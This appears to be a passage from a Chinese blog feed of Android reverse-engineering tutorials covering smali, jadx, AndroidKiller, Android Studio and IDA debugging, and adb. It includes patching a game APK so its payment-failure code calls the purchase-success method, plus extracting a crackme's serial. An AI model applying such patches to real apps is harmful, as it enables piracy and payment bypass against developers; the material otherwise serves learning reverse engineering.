title="0x04、Smali.jar：.smali打包成.dex(回编译)"></a>0x04、Smali.jar：<code>.smali</code>打包成<code>.dex</code>(回编译)</h3><pre class="line-numbers language-none"><code class="language-none">java -jar smali.jar smali_out/ -o classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、Dalvik字节码类型"><a href="#4、Dalvik字节码类型" class="headerlink" title="4、Dalvik字节码类型"></a>4、Dalvik字节码类型</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115911.png" alt="image-20210720110116488"></p><p>注意：除了红色字体 其他java对应的Dalvik字节码都是首字母</p><h2 id="5、字段"><a href="#5、字段" class="headerlink" title="5、字段"></a>5、字段</h2><p>Lpackage/name/ObjectName; —&gt;FieldName: Ljava/lang/String;</p><p>字段格式：类型(包名+类名)—&gt;字段名称：字段类型<br>解释：一个完整的类里面有方法、变量，字段表示的是变量，是成员变量的意思</p><pre class="line-numbers language-none"><code class="language-none">Package com.dayu.demoClass dome{String FieldName;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="6、方法"><a href="#6、方法" class="headerlink" title="6、方法"></a>6、方法</h2><p>Lpackage/name/ObjectName;—&gt;MethodName(III)Z<br>(III)Z：这部分表示的是方法的签名信息</p><pre class="line-numbers language-none"><code class="language-none">Package com.dayu.demoClass dome{String FieldName;Public boolen MethodName(int1,int2,int3){};}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><p>介绍其他的一个小工具：jadx-gui-1.2.0.exe</p><p>它是绿色版的 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115912.png" alt="image-20210717005024176"></p><p>很小的 直接点击使用 即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115913.png" alt="image-20210717005647819"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115914.png" alt="image-20210717005723524"></p><p>当我们点击购买 取消之后</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115915.png" alt="image-20210717010025291"></p><p>它会弹出：<strong>支付取消</strong></p><p>把贪吃蛇的APK直接丢到<code>jadx-gui</code>中</p><p>进行搜索</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115916.png" alt="image-20210717005956258"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115917.png" alt="image-20210717010116802"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115918.png" alt="image-20210717010140572"></p><p>找到之后 进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115919.png" alt="image-20210717010243022"></p><p>支付失败和支付取消 都调用了<code>zombie.BuyFailed();</code>这个方法</p><p>进一步查看这个方法</p><p>ctrl+鼠标左键</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115920.png" alt="image-20210717010613354"></p><pre class="line-numbers language-none"><code class="language-none">public static native void BuyFailed(); #支付失败public static native void BuySccess(); #支付成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么这里的思路 就是把支付失败和支付取消的代码 都替换成支付成功的代码，然后进行反编译输出</p><p>这边我还是习惯使用AK：AndroidKiller</p><p>这里要注意：</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115921.png" alt="image-20210720112617747"></p><p>要进行文本转Unicode</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115922.png" alt="image-20210720112704770"></p><pre class="line-numbers language-none"><code class="language-none">const-string v1, "\u652f\u4ed8\u6210\u529f"const/4 v2, 0x0invoke-static {v0, v1, v2}, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;move-result-object v0invoke-virtual {v0}, Landroid/widget/Toast;-&gt;show()V.line 121invoke-static {}, Lcom/qy/zombie/zombie;-&gt;BuySccess()V.line 122return-void<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115923.png" alt="image-20210720112850621"></p><p>进行替换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115924.png" alt="image-20210720113048483"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115925.png" alt="image-20210720113127156"></p><p>然后保存 反编译输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115926.png" alt="image-20210720113225130"></p><p>进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115927.png" alt="image-20210720114054949"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115928.png" alt="image-20210720114135291"></p><p>破解成功</p><p>这里有很多 可以自己玩一玩</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(二) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(五)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-wu/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-wu/</url>
      
        <content type="html"><![CDATA[<p>我们继续</p><h2 id="Android-Studio动态调试"><a href="#Android-Studio动态调试" class="headerlink" title="Android Studio动态调试"></a>Android Studio动态调试</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Android Studio本身并不可以反编译APK 开发用的比较多</p><p>它通过导入反编译出来的完整的的Smali代码，然后设置好调试所需的条件，设置断点</p><p>断点准备好的条件后，连接模拟器运行待调试的APK的应用程序，然后执行程序的流程运行到Smali代码的时候，断点处会触发一个断点会自动断下来，从而可以进一步分析和调试，整个程序会非常的清晰。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先来安装一下</p><pre class="line-numbers language-none"><code class="language-none">https://ibotpeaches.github.io/Apktool/https://bitbucket.org/JesusFreke/smali/downloads/https://developer.android.google.cn/studio/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121444504.png" alt="image-20210805161808409"></p><p>一路默认过去就可以</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121444173.png" alt="image-20210805161919811"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121444962.png" alt="image-20210805161947592"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121444418.png" alt="image-20210805162017553"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121613725.png" alt="image-20210805162042442"></p><p>然后一路next </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614774.png" alt="image-20210805164600449"></p><h3 id="导入项目包"><a href="#导入项目包" class="headerlink" title="导入项目包"></a>导入项目包</h3><p>既然Android Studio不可以反编译</p><p>那么我们就首先把APK丢到Android Killer中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614835.png" alt="image-20210805164909385"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614871.png" alt="image-20210805164932533"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614048.png" alt="image-20210805164954328"></p><p>我们要的就是这个 反编译完的项目包–Project</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614228.png" alt="image-20210805165135999"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614621.png" alt="image-20210805165231324"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614360.png" alt="image-20210805165252591"></p><p>然后继续一路默认即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659141.png" alt="image-20210805165606553"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614591.png" alt="image-20210805165942265"></p><h3 id="添加插件"><a href="#添加插件" class="headerlink" title="添加插件"></a>添加插件</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121614725.png" alt="image-20210805170030847"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615048.png" alt="image-20210805170250468"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615040.png" alt="image-20210805170511650"></p><h3 id="给项目root权限"><a href="#给项目root权限" class="headerlink" title="给项目root权限"></a>给项目root权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615754.png" alt="image-20210805170646825"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615544.png" alt="image-20210805170718958"></p><h3 id="设置sdk"><a href="#设置sdk" class="headerlink" title="设置sdk"></a>设置sdk</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615769.png" alt="image-20210805170835000"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615778.png" alt="image-20210805170852032"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615305.png" alt="image-20210805171011400"></p><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615530.png" alt="image-20210805171117366"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615942.png" alt="image-20210805171147129"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615522.png" alt="image-20210806115137056"></p><p>自定义Name 端口不要被占用 选中项目文件夹 即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615297.png" alt="image-20210805171407483"></p><h3 id="安装补丁"><a href="#安装补丁" class="headerlink" title="安装补丁"></a>安装补丁</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615046.png" alt="image-20210805232842375"></p><h2 id="adb基本操作"><a href="#adb基本操作" class="headerlink" title="adb基本操作"></a>adb基本操作</h2><h4 id="识别设备"><a href="#识别设备" class="headerlink" title="识别设备"></a>识别设备</h4><pre class="line-numbers language-none"><code class="language-none">adb devices<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615744.png" alt="image-20210806115248075"></p><p>这个就是我的安卓机</p><h4 id="进入安卓机"><a href="#进入安卓机" class="headerlink" title="进入安卓机"></a>进入安卓机</h4><pre class="line-numbers language-none"><code class="language-none">adb shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615356.png" alt="image-20210806115315667"></p><p>之前有提到过的 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615501.png" alt="image-20210806000641560"></p><p>安卓的底层操作系统是Linux操作系统</p><p>这个安卓机 我已经将它root过了</p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><pre class="line-numbers language-none"><code class="language-none">adb shell ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615864.png" alt="image-20210806115350484"></p><p>参数解释</p><pre class="line-numbers language-none"><code class="language-none">adb shell psPID:IDPPID:父进程IDVSIZE:进程的虚拟内存大小kb单位RSS:实际占用的大小RSS:实际占用的大小WCHAN:进程睡眠的函数名称PC∶电脑内核函数名称NAME:包名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注册机破解"><a href="#注册机破解" class="headerlink" title="注册机破解"></a>注册机破解</h2><p>安卓机中打开注册机程序</p><h3 id="项目的入口点"><a href="#项目的入口点" class="headerlink" title="项目的入口点"></a>项目的入口点</h3><p>我们找一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615594.png" alt="image-20210805172823537"></p><p>然后我们重新看进程</p><pre class="line-numbers language-none"><code class="language-none">adb shell ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121615850.png" alt="image-20210806115419773"></p><p>PID就是:2550</p><p>进行转发端口 进行调试</p><p>简单来讲 就是把模拟器中的注册机程序和Android Studio进行联动起来</p><pre class="line-numbers language-none"><code class="language-none">adb forward tcp:8700 jdwp:13362<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121616223.png" alt="image-20210806115531211"></p><p>设置好指定程序后</p><h3 id="进行debug"><a href="#进行debug" class="headerlink" title="进行debug"></a>进行debug</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121616531.png" alt="image-20210806115618788"></p><p>成功连接</p><p>这里记录一个</p><p>万能重启命令</p><pre class="line-numbers language-none"><code class="language-none">adb kill-serveradb start-serveradb remount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们找到<code>checkSN()</code>下断点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121616756.png" alt="image-20210806120336205"></p><p>然后上安卓机</p><p>打开注册机APK</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121616873.png" alt="image-20210806131830131"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108191517530.png" alt="image-20210819151705175"></p><p>点击注册</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617963.png" alt="image-20210806120535690"></p><p>这时候会自动断点跳转到<code>const/4 v7, 0x0</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617811.png" alt="image-20210806120736806"></p><pre class="line-numbers language-none"><code class="language-none">F7:单步步入F8:单步步步F9:跳转到下一个断点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当我们F8 一步步向下走之后</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617377.png" alt="image-20210806121942195"></p><p>看到了跳转MD5算法 开始拼接sb</p><p>继续向下走</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659142.png" alt="image-20210806122051127"></p><p>开始循环拼接sb</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617931.png" alt="image-20210806122241886"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617606.png" alt="image-20210806122257037"></p><pre class="line-numbers language-none"><code class="language-none">userSN="8d9d5d4c03dd33d5"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个就是我们的注册码</p><p>总共循环了32次</p><p>在往下走 就跳出循环了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617009.png" alt="image-20210806122329691"></p><p>尝试注册码 注册</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121617137.png" alt="image-20210806131716293"></p><h2 id="IDA动态调试"><a href="#IDA动态调试" class="headerlink" title="IDA动态调试"></a>IDA动态调试</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>可以看这里:<a href="https://www.freebuf.com/articles/mobile/280471.html">安卓(一)</a></p><h3 id="Android-Killer反编译APK"><a href="#Android-Killer反编译APK" class="headerlink" title="Android Killer反编译APK"></a>Android Killer反编译APK</h3><p>当我们拿到一个APK</p><p>进行Android Killer进行反编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618515.png" alt="image-20210806102309507"></p><p>导出文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618954.png" alt="image-20210806102403016"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659143.png" alt="image-20210806102416377"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618836.png" alt="image-20210806102432197"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618600.png" alt="image-20210806104219599"></p><p>我们找的就是这个<code>.so</code>文件</p><h3 id="打开IDA"><a href="#打开IDA" class="headerlink" title="打开IDA"></a>打开IDA</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618399.png" alt="image-20210806101614285"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618785.png" alt="image-20210806101640818"></p><p>当我们把so文件直接丢进来之后</p><p>会有一个弹窗</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618112.png" alt="image-20210806104415226"></p><p>IDA提供了两种方法去解析</p><p><code>ELF</code>就是so的一个文件格式</p><p><code>Binary file</code>是二进制文件格式</p><p>那肯定是选第一个咯</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121618256.png" alt="image-20210806104723113"></p><p>然后呢 </p><p>这个包下除了<code>.so</code>文件 还多出好多文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121619706.png" alt="image-20210806104817404"></p><p>IDA是递归下降的反汇编工具</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121619705.png" alt="image-20210806140455305"></p><p>地址越来越大</p><p>这里是导航条</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121619639.png" alt="image-20210806140538676"></p><pre class="line-numbers language-none"><code class="language-none">蓝色:表示常规的指令函数- 深蓝:用户写的函数编译后的代码区- 浅蓝:编译器自己添加的函数，像启动函数，异常函数等等黑色:节与节之间的间隙#禁区，不存在任何数据银白色:数据内容粉色:表示外部导入符号#有关输入表的一些数据信息暗黄色:表示IDA未识别的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><pre class="line-numbers language-none"><code class="language-none">IDA View三种反汇编视图:文本视图、图表视图、路径视图Hex View:十六进制窗口Imports:导入函数窗口Struceures:结构体窗口Exports:导出函数窗口Enums:枚举窗口Strings:字符串窗口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121620094.png" alt="image-20210806140958295"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657282.png" alt="image-20210806141437961"></p><p>十六进制 修改 按F2即可</p><p>默认是6张表</p><p>表的添加这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657110.png" alt="image-20210806141607633"></p><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><pre class="line-numbers language-none"><code class="language-none">空格键:切换文本视图与图表视图ESC:返回上一个操作地址G:搜索地址和符号N:对符号进行重命名冒号键:常规注释分号键:可重复注释ALt+M:添加标签Ctrl+M:查看标签Ctrl+S:查看段的信息so代码数据切换C--代码D--数据A--ascii字符串U--解析成未定义的内容X:查看交叉应用F5:查看伪代码ALt+T:搜索文本ALt+B:搜索十六进制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>G:搜索地址和符号</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657795.png" alt="image-20210806142012795"></p><p><strong>Ctrl+S:查看段的信息so</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657834.png" alt="image-20210806142034527"></p><p><strong>ALt+T:搜索文本</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657213.png" alt="image-20210806142426423"></p><p><strong>ALt+B:搜索十六进制</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657493.png" alt="image-20210806142410895"></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="上传android-server"><a href="#上传android-server" class="headerlink" title="上传android_server"></a>上传android_server</h3><p>首先来到IDA的<code>dbgsrv</code>目录</p><pre class="line-numbers language-none"><code class="language-none">C:\IDA 7.0\dbgsrv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657084.png" alt="image-20210806170510753"></p><p>我把它复制到桌面了</p><p>然后利用adb把<code>android_server</code>push到指定目录下</p><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\Administrator\Desktop\android_server data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这边我还是上我的安卓机</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657998.png" alt="image-20210806170824849"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657426.png" alt="image-20210806171122084"></p><p>进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121657814.png" alt="image-20210806171139420"></p><h3 id="进行加权"><a href="#进行加权" class="headerlink" title="进行加权"></a>进行加权</h3><pre class="line-numbers language-none"><code class="language-none">chmod 777 android_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658359.png" alt="image-20210806171228188"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658874.png" alt="image-20210806171345573"></p><p>这里还要提一句 ： 记住安卓的底层是Linux的操作系统</p><p>因为安卓的机制问题 进行更名</p><pre class="line-numbers language-none"><code class="language-none">mv android_server a001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658296.png" alt="image-20210806171537912"></p><h3 id="运行a001"><a href="#运行a001" class="headerlink" title="运行a001"></a>运行a001</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658784.png" alt="image-20210806171757944"></p><p>可以看到它监听的是23946端口</p><p><strong>注：指定端口：</strong></p><pre class="line-numbers language-none"><code class="language-none">./a001 -p1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们继续</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre class="line-numbers language-none"><code class="language-none">adb forward tcp:23946 tcp:23946<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658621.png" alt="image-20210806172132715"></p><h3 id="安装APK到安卓机上"><a href="#安装APK到安卓机上" class="headerlink" title="安装APK到安卓机上"></a>安装APK到安卓机上</h3><p>这次使用的是install</p><pre class="line-numbers language-none"><code class="language-none">adb install C:\Users\Administrator\Desktop\javandk1.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658741.png" alt="image-20210806172245243"></p><h2 id="IDA中Debugger调试"><a href="#IDA中Debugger调试" class="headerlink" title="IDA中Debugger调试"></a>IDA中Debugger调试</h2><p><strong>进行Debugge选择</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121658366.png" alt="image-20210806172632757"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659411.png" alt="image-20210806172702683"></p><p>进行配置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659410.png" alt="image-20210806172722601"></p><p>23946就是默认端口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659030.png" alt="image-20210812022849738"></p><p>调出安卓机的进程窗口</p><p>ctrl+f :进行搜索ndk</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659873.png" alt="image-20210812022953229"></p><p>双击选择之后进来ndk</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659008.png" alt="image-20210812023059042"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659026.png" alt="image-20210812023124211"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659144.png" alt="image-20210812023309088"></p><h2 id="加载模块列表"><a href="#加载模块列表" class="headerlink" title="加载模块列表"></a>加载模块列表</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659145.png" alt="image-20210812023400746"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659146.png" alt="image-20210812023523238"></p><p>分别代表</p><pre class="line-numbers language-none"><code class="language-none">库挂起入口点开始结束加载卸载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表示程序在运行中只要涉及到进程的入口点、涉及到线程的开始和结束、涉及到库的加载和卸载</p><p>都可以让程序进行 debugger(断点)操作！</p><h2 id="运行IDA"><a href="#运行IDA" class="headerlink" title="运行IDA"></a>运行IDA</h2><p>左上角小三角 或者F9都可以</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659148.png" alt="image-20210812023735845"></p><h2 id="普通调试"><a href="#普通调试" class="headerlink" title="普通调试"></a>普通调试</h2><h3 id="环境调整"><a href="#环境调整" class="headerlink" title="环境调整"></a>环境调整</h3><p>运行android_server</p><p>因为安卓的在调试的时候apk等安全机制会对 android_server进行关键名称检测</p><p>所以我做了修改</p><p>端口转发</p><pre class="line-numbers language-none"><code class="language-none">adb forward tcp:23946 tcp:23946<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659149.png" alt="image-20210812024837314"></p><h3 id="挂起程序"><a href="#挂起程序" class="headerlink" title="挂起程序"></a>挂起程序</h3><p>挂起程序(需要程序的包名+类名)<br>使用AndroidKiller进行反编译APK</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659150.png" alt="image-20210812024710109"></p><pre class="line-numbers language-none"><code class="language-none">adb shell am start -D -n com.example.javandk1/.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注：类名前面要加斜杠相对路径</strong></p><p>安卓机弹出一个窗口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659151.png" alt="image-20210812031413475"></p><h3 id="运行ddms"><a href="#运行ddms" class="headerlink" title="运行ddms"></a>运行ddms</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659152.png" alt="image-20210812025319178"></p><p>小图标变红色了</p><h3 id="运行IDA-1"><a href="#运行IDA-1" class="headerlink" title="运行IDA"></a>运行IDA</h3><p>进行连接</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659153.png" alt="image-20210812025452886"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659154.png" alt="image-20210812025511958"></p><p>还是要记得加载模块列表</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659146.png" alt="image-20210812023523238"></p><p>然后运行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659155.png" alt="image-20210812025820338"></p><h2 id="IDA加载so文件"><a href="#IDA加载so文件" class="headerlink" title="IDA加载so文件"></a>IDA加载so文件</h2><h3 id="打开ddms"><a href="#打开ddms" class="headerlink" title="打开ddms"></a>打开ddms</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659156.png" alt="image-20210812025901417"></p><p>查看下调试程序的端口号：8600</p><p>命令</p><pre class="line-numbers language-none"><code class="language-none">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8600<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659157.png" alt="image-20210812031742779"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659158.png" alt="image-20210812030017329"></p><p>图标变成了绿色</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659159.png" alt="image-20210812030034323"></p><p>IDA也成功加载so文件</p><h3 id="Moules模块"><a href="#Moules模块" class="headerlink" title="Moules模块"></a>Moules模块</h3><pre class="line-numbers language-none"><code class="language-none">ndk1-1/oat/arm/base.odex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659160.png" alt="image-20210812030535105"></p><p>双击进入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659161.png" alt="image-20210812032004172"></p><h2 id="安卓逆向-JNI"><a href="#安卓逆向-JNI" class="headerlink" title="安卓逆向-JNI"></a>安卓逆向-JNI</h2><h3 id="1、编写C代码"><a href="#1、编写C代码" class="headerlink" title="1、编写C代码"></a>1、编写C代码</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;int main (){printf("a001")return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、编写-mk文件代码"><a href="#2、编写-mk文件代码" class="headerlink" title="2、编写.mk文件代码"></a>2、编写.mk文件代码</h3><p>mk文件就是在构建工具时，会被 Build System解析多次！</p><pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)LOCAL_MODULE := a001LOCAL_SRC_FILES := a001.c LOCAL_ARM_MODE := arm LOCAL_LDLIBS += -llog include $(BUILD_HARED_LIBRARY) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析</p><pre class="line-numbers language-none"><code class="language-none">1、LOCAL_PATH := $(call 